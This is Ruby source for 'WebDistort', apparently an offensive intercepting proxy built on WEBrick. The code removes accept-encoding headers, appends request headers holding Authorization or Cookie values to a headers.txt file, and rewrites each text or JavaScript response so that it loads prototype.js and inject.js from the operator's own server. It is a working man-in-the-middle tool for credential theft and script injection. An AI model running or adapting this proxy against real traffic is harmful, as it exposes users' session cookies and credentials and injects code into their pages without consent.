#!/usr/bin/ruby

# define external libraries
require "rubygems"
require "dnsruby"
require "optparse"
require "socket"
require "webrick"
require "webrick/httpproxy"
require "webrick/httputils"
require "pp"

class WebDistort
  
  
  
  class Proxy
    @server_ip = ''
    
    @proxy_port = ''
    
    @http_root = ''   
    @http_port = ''
    
    @header_file = nil
    @data_dir = Dir::pwd + '/saved'
    
    @options = nil
    
    
    def modify_body (body)
			prototype_file = "http://" + @server_ip + ":" + @http_port.to_s + "/prototype.js"
      js_file = "http://" + @server_ip + ":" + @http_port.to_s + "/inject.js"

      search_string = '<head>'

      #js_data_file = File.open(@http_root + "/inject.js", "r")
      #js_data = js_data_file.read
      
      replace_string = "<head><script language='javascript' src='" + prototype_file + "'></script><script language='javascript' src='" + js_file + "'></script>"
      #replace_string = "<script language='javascript'>" + js_data + "</script>"
      puts replace_string
      gsub_string = "/" + search_string + "/"
			puts gsub_string
     
      modified_body = body.gsub(search_string, replace_string)
      if modified_body != body
        puts "Successfully modified body!"
        return modified_body
      else
        puts "Body modification failed."
        return body
      end
    end
    
    def initialize(o)
      @options = o
      
      @data_dir = @options['data_dir']
      @http_root = @options['http_root']
      @http_port = @options['http_port']
      @proxy_port = @options['proxy_port']
      @server_ip = @options['server_ip']		
      @grab_all_headers = @options['grab_headers']
    end
    
    def handle_contents(request, response)
      if response.content_type =~/text/ || response.content_type =~/javascript/
        if $header_file == nil
          $header_file = File.open(@data_dir + "/headers.txt", "a")
        end
        
        header_output = request.request_line
        request.raw_header.each {|line| header_output = header_output + line}
        header_output = header_output + "-"*70+"\n"
        
        if @grab_all_headers || header_output =~ /Authorization/ || header_output =~ /Cookie/
          count =  $header_file.syswrite(header_output);	
        end        
        return modify_body(response.body)
      else
        return response.body
      end
    end
    
    
    def start()
      proxy_logger = WEBrick::Log.new(@data_dir + "/proxy.log")
      access_log_file = File.open(@data_dir + "/proxy_access.log", "a")
      access_logger = [[access_log_file, WEBrick::AccessLog::COMBINED_LOG_FORMAT]]
      
      
      proxy = WEBrick::HTTPProxyServer.new(
                                           :Logger => proxy_logger,
                                           :AccessLog => access_logger,
                                           :Port => @proxy_port,
                                           :RequestCallback => Proc.new{|req,res| 
        if req.request_method == "CONNECT" 
          # Handle SSL connections
        end
        req.header.delete('accept-encoding') },
      :ProxyContentHandler => lambda {|request, response|
        response.body = handle_contents(request, response)})
      
      ['INT', 'TERM', 'KILL'].each {|signal|
        trap(signal) { proxy.shutdown ; access_log_file.close }
      }
      proxy.start
    end
  end
end
